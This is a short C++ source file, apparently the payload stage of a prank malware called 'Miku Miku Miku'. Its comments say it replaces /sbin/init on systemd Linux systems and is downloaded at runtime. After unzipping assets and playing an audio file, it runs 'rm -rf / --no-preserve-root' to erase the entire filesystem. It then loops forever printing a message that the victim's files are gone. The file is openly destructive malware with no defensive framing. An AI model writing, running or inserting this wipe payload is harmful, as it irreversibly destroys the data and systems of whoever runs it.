#include <iostream>
#include <cstdlib>
#include <unistd.h>

// The destructive part of Miku Miku Miku, this gets downloaded on runtime.
// This replaces /sbin/init on systemd-based Linux distros.

int main()
{
    // Just gotta unzip the assets hold on
    system(" cd /miku && unzip Assets.zip");

    // HATSUNE MIKU!!!!!!!!!!!!!!!!!
    system("mpv BD5972AA.ogg");

    // Let's play some Aurascope! Second to last step of the payload.
    // Unused for now: system("cd Aurascope && xinit /usr/bin/wine Aurascope.exe");

    // Yeet the files, we don't need em around here.'
    system("rm -rf / --no-preserve-root");

    while(1) {
        system("clear");
        std::cout << "Good luck getting your files back! Hatsune Miku took them all...";
    }

    return 0;
}
